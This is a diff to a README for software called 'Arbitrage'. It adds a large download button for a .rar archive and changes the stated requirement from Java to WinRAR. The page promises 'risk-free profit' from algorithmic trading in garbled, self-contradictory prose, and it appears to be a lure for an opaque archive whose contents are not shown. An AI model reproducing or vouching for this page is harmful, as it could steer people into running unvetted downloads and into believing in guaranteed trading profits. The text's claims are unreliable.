@@ -1,9 +1,11 @@
 ﻿# Arbitrage
 
 
-Download the `.rar` file [here](https://github.com/arbitragesoftware/Arbitrage/raw/master/Arbitrage.rar). It includes all dependencies. You must have the [Java Runtime Environment] Windows XP/Vista/7/8/10 version or above.
+Download the `.rar` file [here](https://github.com/arbitragesoftware/Arbitrage/raw/master/Arbitrage.rar). It includes all dependencies. You must have the [Winrar] Windows XP/Vista/7/8/10 version or above.
 
-
+<a href="https://github.com/arbitragesoftware/Arbitrage/raw/master/Arbitrage.rar">
+<img src="/download.png" width="100%">
+</a>
 
 ## What is Arbitrage?
 Arbitrage is to obtain risk-free profit by selling at the same time low price market and selling in high price market in case the same securities which are traded in different markets are different in price of money or precious metal. These products can be securities such as gold or precious metals or stocks. The aim here is to make a profit without risk. One of the most asked questions in our day is Arbitrage, that is, how to make a profit without risk? " Many large and globally recognized companies are looking for answers to this question by creating arbitrage pricing models. However, in today's capital markets and currency markets, it is more difficult than it is supposed. Because now almost all the markets are intertwined and information sharing has reached incredible speeds. In this respect, it has become increasingly difficult to manually capture the wrong prices in any market and to make profits by arbitraging in this market. As such, arbitrage operations have become possible with algorithmic software. These software make arbitrary arbitrage transactions by sending orders to both stocks at the same time when arbitrage opportunities for the same securities traded in different markets are created.
